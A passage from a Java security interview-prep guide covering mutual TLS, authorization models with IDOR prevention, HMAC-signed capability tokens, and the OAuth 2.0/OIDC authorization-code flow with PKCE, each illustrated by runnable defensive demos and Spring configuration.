        System.out.println("A private CA issued certificates to the server and to orders-service. The server requires a client certificate.");
        System.out.println(attempt("1) orders-service with CA-signed cert", server, context(d.resolve("orders.p12"), d.resolve("trust.p12"))));
        System.out.println(attempt("2) client with no certificate", server, context(null, d.resolve("trust.p12"))));
        System.out.println(attempt("3) self-signed cert, same CN", server, context(d.resolve("rogue.p12"), d.resolve("trust.p12"))));
        System.out.println("-> identity comes from a certificate chain to a trusted CA, not from the name written in the certificate");
        try (var w = Files.walk(d)) { w.sorted(Comparator.reverseOrder()).forEach(p -> p.toFile().delete()); }
    }
}
```

**Output** (identical on all 3 runs):

```text
A private CA issued certificates to the server and to orders-service. The server requires a client certificate.
1) orders-service with CA-signed cert | server authenticated client as CN=orders-service,OU=payments | client got: hello CN=orders-service,OU=payments
2) client with no certificate        | server rejected the connection (SSLHandshakeException) | client got: client failed (SSLHandshakeException)
3) self-signed cert, same CN         | server rejected the connection (SSLHandshakeException) | client got: client failed (SSLHandshakeException)
-> identity comes from a certificate chain to a trusted CA, not from the name written in the certificate
```

- **1:** the CA-signed client is authenticated, and the server reads its identity (`CN=orders-service,OU=payments`) from the verified certificate.
- **2:** a client without a certificate fails the handshake. There's no anonymous access.
- **3:** an impostor with exactly the **same name** but not issued by the trusted CA is rejected. Trust comes from the signature chain, not from the subject text.

**In Spring Boot**
```yaml
server:
  ssl:
    enabled: true
    key-store: classpath:server.p12          # server certificate + key
    key-store-password: ${KEYSTORE_PASSWORD}
    trust-store: classpath:clients-ca.p12     # CAs whose client certificates we accept
    trust-store-password: ${TRUSTSTORE_PASSWORD}
    client-auth: need                         # require a client certificate (mTLS)
```
```java
http.x509(x -> x.subjectPrincipalRegex("CN=(.*?)(?:,|$)"))      // Spring Security maps the certificate CN to a user
    .authorizeHttpRequests(a -> a.requestMatchers("/payments/**").hasRole("SERVICE"));
// Spring Boot 3.1+: SSL bundles (spring.ssl.bundle.jks.*) configure the same for RestClient/WebClient as the CLIENT side
```

| Pros | Cons |
|---|---|
| No shared secret travels over the network; private key never leaves the client | Certificate lifecycle: issuing, rotating, revoking (CRL/OCSP) at scale |
| Strong, phishing-resistant machine identity | Expired certificates are a classic cause of outages |
| Authentication happens before any request is processed | Harder to debug; TLS terminated at a proxy hides the client certificate (forward it in a header securely) |
| Works without user interaction (machines, devices) | Not user-friendly for browsers |

**Pitfalls:** trusting the CN without validating the chain; one shared client certificate for many services; long-lived certificates with no rotation (use short-lived certificates from a service mesh or cert-manager/Vault PKI); TLS termination at a load balancer that doesn't pass the client identity on; not checking revocation for high-value systems.

**Interview questions**
1. *How does mTLS differ from normal TLS?* → In normal TLS only the server presents a certificate; in mTLS the client does too, and the server verifies it against trusted CAs.
2. *Why is the self-signed certificate with the right name rejected?* → Identity is established by the CA's signature on the certificate; anyone can write any name.
3. *How do service meshes use mTLS?* → A sidecar proxy gets a short-lived certificate per workload from the mesh CA and encrypts and authenticates every service-to-service call automatically.
4. *How do you revoke a client certificate?* → CRL or OCSP checks, or (more commonly) short lifetimes with automatic rotation.

**Cheat sheet**
```
mTLS = both sides present X.509 certs ; trust = chain to a trusted CA + validity + revocation + key usage
Spring Boot: server.ssl.client-auth=need + trust-store ; Spring Security http.x509() ; SSL bundles for clients
Ops: short-lived certs + automatic rotation (service mesh, cert-manager, Vault PKI) ; monitor expiry dates
Use for: service-to-service, IoT devices, partner/banking APIs
```

# 2. Authorization Pattern (Interview Imp - Java)

## 2.1 What is Authorization?

**Authorization** decides **what an authenticated identity is allowed to do**: which endpoints, which actions, and **which specific records**. Authentication says *who* you are; authorization says *what you may do*.

**Analogy:** A hotel key card. Reception verified your identity (authentication). The card then opens **your** room, the gym and the pool, but not other guests' rooms or the staff office (authorization).

| Model | Decides by | Example rule |
|---|---|---|
| **RBAC** (Role-Based Access Control) | The user's **roles** | "EDITOR may write documents" |
| **ABAC** (Attribute-Based Access Control) | Attributes of user, resource, action, environment | "Users may read SECRET docs only in their own department, 08:00-20:00" |
| **ACL** (Access Control List) | A list of who may do what on each object | "Doc 42: asha=write, ravi=read" |
| **ReBAC** (Relationship-Based) | Relationships in a graph | "Members of a team may edit the team's projects" (Google Zanzibar, OpenFGA) |
| **Capability-based** | Possession of an unforgeable token granting a specific right | A signed, expiring download URL; an OAuth access token with scopes |

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **Authorization (AuthZ)** | Deciding whether an identity may perform an action on a resource. |
| **Permission** | A specific allowed action (`doc:write`). |
| **Role** | A named bundle of permissions (`EDITOR`). |
| **Policy** | A rule that decides access. |
| **IDOR / BOLA** | Insecure Direct Object Reference / Broken Object Level Authorization: accessing someone else's record by changing an ID. |
| **Capability** | An unforgeable token that itself grants a specific right. |

---

## 2.2 Why Do We Need It?

**Broken access control is the #1 risk in the OWASP Top 10.** Typical failures:

| Failure | Example |
|---|---|
| Missing function-level checks | A regular user calls `DELETE /admin/users/7` and it works |
| **IDOR / BOLA** | `GET /invoices/1001` returns another customer's invoice when you change the number |
| Trusting the client | Price, role or `isAdmin` taken from the request body |
| Checks only in the UI | The "Delete" button is hidden but the API endpoint is open |
| Privilege escalation via mass assignment | `PATCH /users/me {"role":"ADMIN"}` binds straight to the entity |

---

## 2.3 How It Works: Where and How to Check

1. **Deny by default:** every endpoint requires authentication and an explicit rule.
2. **Function-level checks:** can this role call this endpoint/method at all?
3. **Object-level checks:** does this user own / have access to **this specific record**? (Must happen in the service/data layer, on **every** request.)
4. **Field-level rules:** may this user see or change this field (salary, role)?
5. **Least privilege everywhere:** users, services, DB accounts, cloud IAM roles.
6. **Separation of duties** for critical actions (maker-checker approvals).

---

## 2.4 Complete Java Example - RBAC, ABAC and Object-Level Checks

```java
import java.util.List;
import java.util.Map;
import java.util.Set;

record User(String id, Set<String> roles, String department, String region) {}
record Document(String id, String ownerId, String department, String classification) {}

class AccessControl {
    // ---- RBAC: permissions come from roles ----
    static final Map<String, Set<String>> ROLE_PERMISSIONS = Map.of(
            "VIEWER", Set.of("doc:read"),
            "EDITOR", Set.of("doc:read", "doc:write"),
            "ADMIN",  Set.of("doc:read", "doc:write", "doc:delete"));

    static boolean rbac(User u, String permission) {
        return u.roles().stream().anyMatch(r -> ROLE_PERMISSIONS.getOrDefault(r, Set.of()).contains(permission));
    }

    // ---- ABAC: decisions use attributes of user, resource and context ----
    static String abac(User u, Document d, String action, int hourOfDay) {
        if (d.classification().equals("SECRET") && !u.department().equals(d.department())) return "DENY (secret docs: own department only)";
        if (action.equals("doc:write") && (hourOfDay < 8 || hourOfDay > 20)) return "DENY (writes allowed 08:00-20:00 only)";
        if (!rbac(u, action)) return "DENY (role lacks " + action + ")";
        return "ALLOW";
    }

    // ---- Object-level check (prevents IDOR / BOLA) ----
    static String readOwnInvoice(User u, Document invoice) {
        if (!invoice.ownerId().equals(u.id()) && !u.roles().contains("ADMIN")) return "403 (not your invoice)";
        return "200 " + invoice.id();
    }
}

public class AuthorizationDemo {
    public static void main(String[] args) {
        User asha = new User("asha", Set.of("EDITOR"), "finance", "IN");
        User ravi = new User("ravi", Set.of("VIEWER"), "sales", "IN");
        User admin = new User("root", Set.of("ADMIN"), "it", "IN");

        System.out.println("RBAC:");
        for (User u : List.of(asha, ravi, admin)) {
            System.out.printf("   %-5s roles=%-9s write=%-5s delete=%s%n", u.id(), u.roles(), AccessControl.rbac(u, "doc:write"), AccessControl.rbac(u, "doc:delete"));
        }

        System.out.println("ABAC (user + resource + context attributes):");
        Document budget = new Document("budget-2027", "asha", "finance", "SECRET");
        System.out.println("   asha  writes finance SECRET doc at 11:00 -> " + AccessControl.abac(asha, budget, "doc:write", 11));
        System.out.println("   asha  writes finance SECRET doc at 23:00 -> " + AccessControl.abac(asha, budget, "doc:write", 23));
        System.out.println("   admin reads  finance SECRET doc          -> " + AccessControl.abac(admin, budget, "doc:read", 11) + "  <- even admins");
        System.out.println("   ravi  reads  finance SECRET doc          -> " + AccessControl.abac(ravi, budget, "doc:read", 11));

        System.out.println("Object-level authorization (IDOR): GET /invoices/{id}");
        Document ashaInvoice = new Document("INV-1001", "asha", "finance", "INTERNAL");
        System.out.println("   asha GET /invoices/INV-1001 -> " + AccessControl.readOwnInvoice(asha, ashaInvoice));
        System.out.println("   ravi GET /invoices/INV-1001 -> " + AccessControl.readOwnInvoice(ravi, ashaInvoice) + "  <- logged in, but someone else's object");
    }
}
```

**Output:**
```
RBAC:
   asha  roles=[EDITOR]  write=true  delete=false
   ravi  roles=[VIEWER]  write=false delete=false
   root  roles=[ADMIN]   write=true  delete=true
ABAC (user + resource + context attributes):
   asha  writes finance SECRET doc at 11:00 -> ALLOW
   asha  writes finance SECRET doc at 23:00 -> DENY (writes allowed 08:00-20:00 only)
   admin reads  finance SECRET doc          -> DENY (secret docs: own department only)  <- even admins
   ravi  reads  finance SECRET doc          -> DENY (secret docs: own department only)
Object-level authorization (IDOR): GET /invoices/{id}
   asha GET /invoices/INV-1001 -> 200 INV-1001
   ravi GET /invoices/INV-1001 -> 403 (not your invoice)  <- logged in, but someone else's object
```

What the output shows:
- **RBAC** is simple: permissions follow from roles.
- **ABAC** expresses rules RBAC can't: the same editor is allowed at 11:00 but denied at 23:00, and **even an ADMIN** is denied a SECRET document from another department (role alone isn't enough).
- The **object-level check** stopped Ravi, who is logged in and allowed to read invoices in general, from reading **Asha's** invoice by guessing its ID: the classic **IDOR** bug.

---

## 2.5 Authorization in Spring Security

```java
@Configuration
@EnableMethodSecurity                                         // enables @PreAuthorize / @PostAuthorize
class AuthzConfig {
    @Bean
    SecurityFilterChain api(HttpSecurity http) throws Exception {
        return http.authorizeHttpRequests(a -> a
                        .requestMatchers(HttpMethod.GET, "/api/products/**").permitAll()
                        .requestMatchers("/api/admin/**").hasRole("ADMIN")                  // function-level
                        .requestMatchers(HttpMethod.POST, "/api/orders").hasAuthority("SCOPE_orders:write")
                        .anyRequest().authenticated())                                        // deny by default
                .oauth2ResourceServer(o -> o.jwt(Customizer.withDefaults()))
                .build();
    }
}

@Service
class InvoiceService {
    // Object-level: the invoice must belong to the caller (or the caller is an admin)
    @PreAuthorize("hasRole('ADMIN') or @invoiceSecurity.isOwner(#invoiceId, authentication.name)")
    public InvoiceDto get(String invoiceId) { ... }

    // Or filter at the query level so other users' rows are never even loaded
    public List<InvoiceDto> mine(Authentication auth) {
        return repo.findByOwnerId(auth.getName()).stream().map(InvoiceDto::from).toList();
    }
}

@Component("invoiceSecurity")
class InvoiceSecurity {
    private final InvoiceRepository repo;
    InvoiceSecurity(InvoiceRepository repo) { this.repo = repo; }
    public boolean isOwner(String invoiceId, String user) {
        return repo.findById(invoiceId).map(i -> i.ownerId().equals(user)).orElse(false);
    }
}
```

> **Prevent mass assignment:** bind requests to **DTOs** that contain only the fields the user may change (no `role`, `ownerId`, `price` fields), never directly to JPA entities.

| Need | Option |
|---|---|
| Simple roles | `hasRole`, `hasAuthority`, `@PreAuthorize` |
| Custom rules in Java | `AuthorizationManager` beans, permission evaluators |
| Central, auditable policies across services | Policy engines: **Open Policy Agent (OPA)** with Rego, **AWS Cedar**, OpenFGA/SpiceDB for ReBAC |
| Row-level security in the DB | PostgreSQL Row-Level Security policies |

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **`@EnableMethodSecurity`** | Turns on annotation-based method security in Spring Security 6. |
| **`hasRole` vs `hasAuthority`** | `hasRole('ADMIN')` checks authority `ROLE_ADMIN`; `hasAuthority` checks the exact string (e.g. `SCOPE_orders:write`). |
| **Mass assignment** | Binding request fields directly onto internal objects, letting attackers set fields they shouldn't. |
| **OPA (Open Policy Agent)** | A general-purpose policy engine; services ask it "is this allowed?". |
| **Row-Level Security (RLS)** | Database feature that filters rows per user automatically. |
| **Maker-checker** | One person creates a sensitive change, another approves it (separation of duties). |

---

## 2.6 Pros, Cons, Pitfalls and Interview Questions

| Model | Pros | Cons |
|---|---|---|
| RBAC | Simple, easy to audit | Role explosion for fine-grained rules |
| ABAC | Expressive, context-aware | Harder to reason about and test |
| ReBAC | Natural for sharing/collaboration apps | Needs a dedicated authorization service |

| Pitfall | Fix |
|---|---|
| Only checking roles, not object ownership (IDOR) | Object-level checks on every access, or query by owner. |
| Authorization only in the frontend | Enforce on the server. |
| Permissive defaults (`permitAll` everywhere) | `anyRequest().authenticated()`; explicit public paths. |
| Binding requests to entities | DTOs with allowed fields only. |
| Services using a superuser DB account | Least-privilege DB users per service. |
| Sequential, guessable IDs revealing data | Object-level checks (UUIDs help but aren't a substitute). |

**Q1. Authentication vs authorization?** Authentication verifies identity; authorization decides what that identity may do. AuthN first, then AuthZ.

**Q2. RBAC vs ABAC?** RBAC grants permissions through roles (simple, coarse). ABAC evaluates attributes of user, resource, action and environment (fine-grained, contextual).

**Q3. What is IDOR and how do you prevent it?** Insecure Direct Object Reference: accessing another user's object by changing its ID. Prevent with object-level authorization checks (ownership/ACL) on every request, or by scoping queries to the current user.

**Q4. How do you implement method-level security in Spring?** `@EnableMethodSecurity` and `@PreAuthorize("hasRole('ADMIN') or @bean.check(#id, authentication)")` on service methods.

**Q5. What is the principle of least privilege?** Give every user, service and process only the minimum permissions needed, for the shortest time needed.

---

## 2.7 Authorization - Cheat Sheet

```
AUTHORIZATION  What may this identity do? OWASP #1 risk (broken access control).
          Models: RBAC (roles) | ABAC (attributes + context) | ACL | ReBAC (relationships, Zanzibar/OpenFGA) | capabilities (scoped tokens).
          Deny by default; function-level + OBJECT-level (IDOR/BOLA) + field-level checks; least privilege; separation of duties.
          Spring: authorizeHttpRequests (hasRole/hasAuthority, anyRequest().authenticated()), @EnableMethodSecurity + @PreAuthorize
                  with bean checks, query by owner, DTOs against mass assignment. Policy engines: OPA, Cedar.
```

---

## 2.8 Types and Variants, Including Capability-Based Security

| Model | Decision based on | Example |
|---|---|---|
| **ACL (access control list)** | A list on each resource of who may do what | File permissions, S3 bucket ACLs |
| **RBAC** | The user's roles | `hasRole('ADMIN')` |
| **ABAC** | Attributes of user, resource, action and context | "owner or same department, during working hours" |
| **ReBAC (relationship-based)** | Relationships in a graph | Google Zanzibar, OpenFGA, SpiceDB ("editor of the folder that contains the doc") |
| **PBAC / policy engines** | Central policies as code | OPA (Rego), AWS IAM policies, Cedar |
| **Capability-based** | **Possession of an unforgeable token that itself carries the right** | Pre-signed S3 URLs, signed download links, OAuth access tokens with scopes, macaroons |
| **Scopes / permissions** | Fine-grained permissions in tokens | OAuth `orders:read`, Spring `hasAuthority('SCOPE_orders:read')` |

**Capability-based security in depth.** In identity-based models the system asks *"who are you, and is that identity on the list?"*. In a capability model it asks *"do you hold a valid token for this action?"*. The token names the resource and the rights, is signed (unforgeable), usually expires, and can be **attenuated** (a holder can obtain a weaker copy to share) and **revoked** (expiry, or bumping a version/key). It solves the *confused deputy* problem: a program only acts with the capabilities it was handed, not with all the authority of its user.

**Complete Java example - signed, expiring, attenuable capabilities**

```java
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.*;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

public class CapabilityDemo {

    // A capability = an unforgeable token that IS the permission: "read file 42 until t=1000".
    // Here it is an HMAC-signed string, like an S3 pre-signed URL or a signed download link.
    static final byte[] SERVER_KEY = "server-side-secret-never-shared".getBytes(StandardCharsets.UTF_8);
    static final Map<String, Integer> keyVersion = new HashMap<>(Map.of("file-42", 1));   // bump to revoke all links for a resource

    static String sign(String payload) throws Exception {
        Mac mac = Mac.getInstance("HmacSHA256"); mac.init(new SecretKeySpec(SERVER_KEY, "HmacSHA256"));
        return Base64.getUrlEncoder().withoutPadding().encodeToString(mac.doFinal(payload.getBytes(StandardCharsets.UTF_8)));
    }
    static String mint(String resource, String rights, long expires) throws Exception {
        String payload = resource + "|" + rights + "|" + expires + "|v" + keyVersion.get(resource);
        return payload + "|" + sign(payload);
    }
    // Attenuation: anyone holding a capability can derive a WEAKER one (fewer rights, earlier expiry) by asking the issuer
    static String attenuate(String cap, String fewerRights, long earlierExpiry) throws Exception {
        String[] p = cap.split("\\|");
        if (!check(cap, p[0], p[1].substring(0, 1), 0).startsWith("ALLOW")) throw new SecurityException("invalid parent capability");
        for (char c : fewerRights.toCharArray()) if (p[1].indexOf(c) < 0) throw new SecurityException("cannot add right '" + c + "'");
        return mint(p[0], fewerRights, Math.min(earlierExpiry, Long.parseLong(p[2])));
    }

    static String check(String cap, String resource, String right, long now) throws Exception {
        String[] p = cap.split("\\|");
        if (p.length != 5) return "DENY malformed";
        String payload = String.join("|", p[0], p[1], p[2], p[3]);
        if (!MessageDigest.isEqual(sign(payload).getBytes(), p[4].getBytes())) return "DENY bad signature (forged or edited)";
        if (!p[0].equals(resource)) return "DENY capability is for " + p[0];
        if (!p[1].contains(right)) return "DENY right '" + right + "' not granted (has '" + p[1] + "')";
        if (now > Long.parseLong(p[2])) return "DENY expired at t=" + p[2];
        if (!p[3].equals("v" + keyVersion.get(resource))) return "DENY revoked (version " + p[3] + ")";
        return "ALLOW " + right + " on " + resource;
    }

    public static void main(String[] args) throws Exception {
        String cap = mint("file-42", "rw", 1000);
        System.out.println("1) owner mints a capability: " + cap.substring(0, cap.lastIndexOf('|') + 9) + "...");
        System.out.println("   holder reads at t=100      : " + check(cap, "file-42", "r", 100));
        System.out.println("   holder writes at t=100     : " + check(cap, "file-42", "w", 100));
        System.out.println("   used for file-43           : " + check(cap, "file-43", "r", 100));
        System.out.println("   used at t=2000             : " + check(cap, "file-42", "r", 2000));

        String forged = cap.replace("|rw|", "|rwd|");
        System.out.println("2) holder edits rights to rwd : " + check(forged, "file-42", "d", 100));

        String readOnly = attenuate(cap, "r", 500);
        System.out.println("3) attenuated share (r, t<=500): read=" + check(readOnly, "file-42", "r", 100) + " | write=" + check(readOnly, "file-42", "w", 100));
        try { attenuate(readOnly, "rw", 900); } catch (SecurityException e) { System.out.println("   trying to widen it back    : " + e.getMessage()); }

        keyVersion.put("file-42", 2);
        System.out.println("4) owner revokes (version 2)  : " + check(cap, "file-42", "r", 100));
        System.out.println("-> no user lookup and no ACL check: possession of a valid token is the permission (so keep tokens short-lived and secret)");
    }
}
```

**Output** (identical on all 3 runs):

```text
1) owner mints a capability: file-42|rw|1000|v1|ungRvNRd...
   holder reads at t=100      : ALLOW r on file-42
   holder writes at t=100     : ALLOW w on file-42
   used for file-43           : DENY capability is for file-42
   used at t=2000             : DENY expired at t=1000
2) holder edits rights to rwd : DENY bad signature (forged or edited)
3) attenuated share (r, t<=500): read=ALLOW r on file-42 | write=DENY right 'w' not granted (has 'r')
   trying to widen it back    : cannot add right 'w'
4) owner revokes (version 2)  : DENY revoked (version v1)
-> no user lookup and no ACL check: possession of a valid token is the permission (so keep tokens short-lived and secret)
```

- The capability works only for `file-42`, only for the granted rights, and only until t=1000.
- Editing the token (adding the `d` right) breaks the HMAC signature.
- A read-only, shorter-lived copy can be shared, and it cannot be widened again.
- Bumping the resource's version revokes every outstanding token at once.

**In Spring / AWS**
```java
// AWS SDK v2: a 10-minute read capability for one object (no IAM user for the downloader)
PresignedGetObjectRequest p = presigner.presignGetObject(r -> r.signatureDuration(Duration.ofMinutes(10))
        .getObjectRequest(g -> g.bucket("invoices").key("2025/inv-42.pdf")));
String url = p.url().toString();     // anyone with this URL can GET that object until it expires
```

| Pros | Cons |
|---|---|
| No central lookup per request; scales and works offline | A leaked token works for whoever holds it (bearer semantics) |
| Least privilege: exactly one resource and right | Revocation is harder (needs short expiry or versioning) |
| Easy delegation and attenuation | Tokens in URLs leak via logs, referrer headers, browser history |

**Cheat sheet**
```
Models: ACL, RBAC, ABAC, ReBAC (Zanzibar/OpenFGA), policy engines (OPA, Cedar), capabilities
Capability = signed token {resource, rights, expiry, version} ; possession = permission
Short-lived + narrow + revocable (version/key rotation) ; never log full URLs with signatures
Examples: S3 pre-signed URLs, signed CDN cookies, OAuth scoped access tokens, macaroons
```

# 3. OAuth 2.0, OpenID Connect, SSO and Federated Identity (Interview Imp - Java)

## 3.1 What Are They?

- **OAuth 2.0** is a framework for **delegated authorization**: a user lets an application access **their resources** on another service **without giving it their password**. The app receives an **access token** with limited **scopes**.
- **OpenID Connect (OIDC)** is an **identity layer on top of OAuth 2.0**: it adds an **ID token** (a JWT saying who the user is) so apps can **log users in**.
- **Single Sign-On (SSO)**: one login gives access to many applications (via OIDC or SAML).
- **Federated identity**: trusting identities from an external provider ("Sign in with Google", corporate Azure AD/Okta for employees).

**Analogy:** A hotel valet key. You give the valet a special key (access token) that can drive and park the car but can't open the boot or glovebox (limited scope), instead of your full set of keys (your password). OIDC adds a name badge saying who the valet is.

| Role | Who | Example |
|---|---|---|
| **Resource owner** | The user | Asha |
| **Client** | The app wanting access | The shop's SPA or mobile app |
| **Authorization server** | Issues tokens after login/consent | Keycloak, Okta, Auth0, Azure AD (Entra ID), Spring Authorization Server |
| **Resource server** | The API that accepts tokens | The orders API |

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **OAuth 2.0** | Standard for apps to obtain limited access tokens on behalf of a user (or themselves). |
| **OIDC** | OpenID Connect: OAuth 2.0 + an ID token and user-info endpoint for login. |
| **Scope** | A named permission requested by the app (`orders:read`). |
| **Access token / ID token / refresh token** | Token for calling APIs / token describing the user (for the client) / long-lived token to get new access tokens. |
| **SAML** | Older XML-based SSO standard, common in enterprises. |
| **IdP** | Identity Provider: the system that authenticates users (Google, Okta, Keycloak). |

---

## 3.2 Why Do We Need It?

| Without OAuth/OIDC | With it |
|---|---|
| Third-party apps ask for your password | Apps get scoped, revocable tokens; your password stays with the IdP |
| Every app implements its own login, MFA, password reset | One IdP handles login, MFA, lockout, SSO |
| Employees have separate accounts everywhere | SSO: one corporate login, central de-provisioning |
| APIs must call back to check sessions | APIs verify signed tokens locally |

---

## 3.3 How It Works: The Grant Types (Flows)

| Flow | Who uses it | Status |
|---|---|---|
| **Authorization Code + PKCE** ✅ | Web apps, SPAs, mobile apps (any user login) | **Recommended for all** user-facing clients |
| **Client Credentials** ✅ | Service-to-service (no user) | Recommended for machine identity |
| **Device Authorization** | TVs, CLIs (user approves on another device) | Recommended for input-constrained devices |
| **Refresh Token** | Getting new access tokens without re-login | Rotate refresh tokens; bind to client |
| Implicit | Old SPAs (token in URL fragment) | ❌ Deprecated (OAuth 2.1 removes it) |
| Resource Owner Password | App collects the user's password | ❌ Deprecated (OAuth 2.1 removes it) |

```mermaid
sequenceDiagram
    participant U as User's browser
    participant C as Client app (SPA / web)
    participant AS as Authorization server (Keycloak)
    participant API as Resource server (orders API)
    C->>C: create code_verifier (random), code_challenge = SHA256(verifier), state
    C->>U: redirect to /authorize?client_id&redirect_uri&scope&state&code_challenge
    U->>AS: login + MFA + consent
    AS->>U: redirect to redirect_uri?code=...&state=...
    U->>C: code + state
    C->>C: check state matches
    C->>AS: POST /token (code + code_verifier)
    AS->>AS: SHA256(verifier) == challenge?
    AS-->>C: access_token (+ refresh_token, id_token)
    C->>API: GET /orders  Authorization: Bearer access_token
    API->>API: verify signature, exp, aud, scope
```

**PKCE** ("pixy", Proof Key for Code Exchange) binds the authorization code to the client that started the flow: an attacker who intercepts the code can't exchange it without the secret **code verifier**. **`state`** protects the redirect against CSRF; **`nonce`** (OIDC) binds the ID token to the login request.

---

## 3.4 Complete Java Example - Authorization Code Flow with PKCE

```java
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

// OAuth 2.0 Authorization Code flow with PKCE (RFC 7636), simulated end to end
class AuthorizationServer {
    private final Map<String, String> codeToChallenge = new HashMap<>();
    private final Map<String, String> codeToUser = new HashMap<>();

    // Step 2: user logs in and consents; server returns a one-time code bound to the code_challenge
    String authorize(String user, String clientId, String redirectUri, String state, String codeChallenge, String method) {
        if (!clientId.equals("shop-spa") || !redirectUri.equals("https://shop.com/callback")) throw new IllegalArgumentException("unknown client/redirect");
        if (!method.equals("S256")) throw new IllegalArgumentException("only S256 allowed");
        String code = "code-" + user;
        codeToChallenge.put(code, codeChallenge);
        codeToUser.put(code, user);
        return redirectUri + "?code=" + code + "&state=" + state;
    }

    // Step 4: client exchanges code + code_verifier for tokens; the server checks SHA256(verifier) == challenge
    String token(String code, String codeVerifier) throws Exception {
        String challenge = codeToChallenge.remove(code);                 // codes are single-use
        if (challenge == null) return "400 invalid_grant (code unknown or already used)";
        if (!Pkce.s256(codeVerifier).equals(challenge)) return "400 invalid_grant (PKCE verifier mismatch)";
        String user = codeToUser.remove(code);
        return "200 {access_token: <JWT for " + user + ", 5 min>, refresh_token: <opaque, rotating>, id_token: <OIDC identity>}";
    }
}

public class OAuthPkceDemo {
    public static void main(String[] args) throws Exception {
        // RFC 7636 Appendix B test vector
        String verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";
        String challenge = Pkce.s256(verifier);
        System.out.println("code_verifier  = " + verifier);
        System.out.println("code_challenge = " + challenge + "  (RFC 7636 expects E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM)");

        AuthorizationServer as = new AuthorizationServer();
        String state = "xyz-random-123";
        System.out.println("1) SPA redirects the browser to /authorize?response_type=code&client_id=shop-spa&code_challenge=...&state=" + state);
        String redirect = as.authorize("asha", "shop-spa", "https://shop.com/callback", state, challenge, "S256");
        System.out.println("2) after login + consent, browser returns to " + redirect);
        String returnedState = redirect.replaceAll(".*state=", "");
        System.out.println("3) SPA checks state matches what it sent (CSRF protection): " + returnedState.equals(state));
        System.out.println("4) attacker who stole the code but not the verifier -> " + as.token("code-asha", "guessed-verifier"));

        String redirect2 = as.authorize("asha", "shop-spa", "https://shop.com/callback", state, challenge, "S256");
        String code = redirect2.replaceAll(".*code=([^&]+).*", "$1");
        System.out.println("5) legitimate SPA exchanges code + verifier -> " + as.token(code, verifier));
        System.out.println("6) replaying the same code again -> " + as.token(code, verifier));
    }
}

class Pkce {
    static String s256(String verifier) throws Exception {
        byte[] hash = MessageDigest.getInstance("SHA-256").digest(verifier.getBytes(StandardCharsets.US_ASCII));
        return Base64.getUrlEncoder().withoutPadding().encodeToString(hash);
    }
}
```

**Output:**
```
code_verifier  = dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
code_challenge = E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM  (RFC 7636 expects E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM)
1) SPA redirects the browser to /authorize?response_type=code&client_id=shop-spa&code_challenge=...&state=xyz-random-123
2) after login + consent, browser returns to https://shop.com/callback?code=code-asha&state=xyz-random-123
3) SPA checks state matches what it sent (CSRF protection): true
4) attacker who stole the code but not the verifier -> 400 invalid_grant (PKCE verifier mismatch)
5) legitimate SPA exchanges code + verifier -> 200 {access_token: <JWT for asha, 5 min>, refresh_token: <opaque, rotating>, id_token: <OIDC identity>}
6) replaying the same code again -> 400 invalid_grant (code unknown or already used)
```

What the output shows:
- The computed `code_challenge` matches the **RFC 7636 Appendix B** test vector exactly.
- The client verified the returned `state` matches what it sent (protection against forged redirects).
- An attacker who **stole the authorization code** (e.g. from logs or a malicious app on the device) **couldn't redeem it** without the code verifier.
- The legitimate client got tokens; **replaying** the same code failed because codes are **single-use**.

---

## 3.5 OAuth 2.0 and OIDC in Spring

```yaml
# 1) Web app login with OIDC ("Sign in with ..."): spring-boot-starter-oauth2-client
spring:
  security:
    oauth2:
      client:
        registration:
          keycloak:
            client-id: shop-web
            client-secret: ${SHOP_WEB_CLIENT_SECRET}
            scope: openid, profile, email, orders:read
            authorization-grant-type: authorization_code
        provider:
          keycloak:
            issuer-uri: https://auth.shop.com/realms/shop
```

```java
@Bean
SecurityFilterChain web(HttpSecurity http) throws Exception {
    return http
            .authorizeHttpRequests(a -> a.anyRequest().authenticated())
            .oauth2Login(Customizer.withDefaults())                    // authorization code flow (+ PKCE), session-based
            .logout(l -> l.logoutSuccessUrl("/"))
            .build();
}
```

```yaml
# 2) API validating access tokens: spring-boot-starter-oauth2-resource-server
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: https://auth.shop.com/realms/shop
          audiences: orders-api
```

| Setup | Spring |
|---|---|
| Login to a server-rendered app / BFF | `oauth2Login()` (tokens stay on the server; browser gets a session cookie) |
| API accepting tokens | `oauth2ResourceServer(o -> o.jwt(...))` or opaque tokens with introspection |
| Service-to-service | Client credentials + `OAuth2AuthorizedClientManager` ([02_Microservices_Pattern.md](../04_Specialized/02_Microservices_Pattern.md#95-access-tokens-in-spring-boot)) |
| Running your own authorization server | **Spring Authorization Server**, or Keycloak |
| Gateway passing user tokens on | Spring Cloud Gateway `TokenRelay` |

> **SPAs:** the current best practice is the **BFF pattern for browser apps**: the SPA talks to its own backend with an `HttpOnly` session cookie; the backend holds the OAuth tokens and calls APIs. Tokens never sit in browser JavaScript, which removes XSS token theft.

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **PKCE** | Proof Key for Code Exchange: the client proves it started the flow by revealing the verifier that hashes to the challenge. |
| **`state` / `nonce`** | Random values that tie the redirect / ID token to the request the client actually made. |
| **Consent** | The user approving which scopes the app may have. |
| **Token introspection** | Asking the auth server whether an opaque token is valid. |
| **Spring Authorization Server** | Spring project for building your own OAuth 2.1 / OIDC authorization server. |
| **Keycloak** | Open-source identity and access management server (OIDC, SAML, MFA, SSO). |

---

## 3.6 Pros, Cons, Pitfalls and Interview Questions

| Pitfall | Fix |
|---|---|
| Implicit or password grant in new apps | Authorization code + PKCE (OAuth 2.1). |
| Using the access token as proof of login in the client | Use the OIDC **ID token** for identity; the access token is for APIs. |
| Not validating `state`/`nonce`, open redirect URIs | Exact redirect URI registration; validate state and nonce. |
| Long-lived access tokens | Minutes; use rotating refresh tokens. |
